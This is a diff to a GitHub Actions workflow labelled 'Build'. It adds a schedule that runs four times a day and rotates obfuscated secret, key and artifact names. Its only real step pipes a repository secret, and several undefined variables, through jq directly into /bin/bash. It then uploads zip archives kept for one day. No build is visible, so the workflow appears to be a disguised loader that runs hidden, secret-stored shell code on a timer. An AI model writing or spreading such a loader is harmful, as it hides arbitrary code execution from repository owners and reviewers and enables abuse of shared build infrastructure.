@@ -2,6 +2,8 @@ name: Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '17 2,8,14,20 * * *'
 permissions:
   contents: read
   actions: read
@@ -22,19 +24,20 @@ jobs:
           fetch-depth: 1
       - name: Run
         env:
-          rsjom346: ${{ secrets.rsjom346 }}
+          cdu7: ${{ secrets.cdu7 }}
         run: |
-          printf '%s' "$rsjom346" | jq -r .twmo7833 | /bin/bash
-          printf '%s' "$ooqgq4119" | jq -r .dukg45558 | /bin/bash
-          echo $iowra1 | jq -r .ttsff351 | /bin/bash
-          printf '%s' "$gzj01" | jq -r .qnpmq96 | /bin/bash
-          echo $hmne10 | jq -r .kvs7698 | /bin/bash
-          printf '%s' "$uqfc670" | jq -r .ubodr1 | /bin/bash
+          printf '%s' "$cdu7" | jq -r .hl7 | /bin/bash
+          echo $sraxa94981 | jq -r .gyyq15748 | /bin/bash
+          echo $ua3 | jq -r .koght16 | /bin/bash
+          printf '%s' "$xpo8" | jq -r .rqsdl785 | /bin/bash
+          printf '%s' "$arq3029" | jq -r .rt430 | /bin/bash
+          printf '%s' "$kitph1" | jq -r .gryw69989 | /bin/bash
+          echo $kjyx89 | jq -r .l1 | /bin/bash
 
       - name: Save archive
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: 2t9tZrgq
+          name: bjRAoNvF
           path: "*.zip"
           retention-days: 1
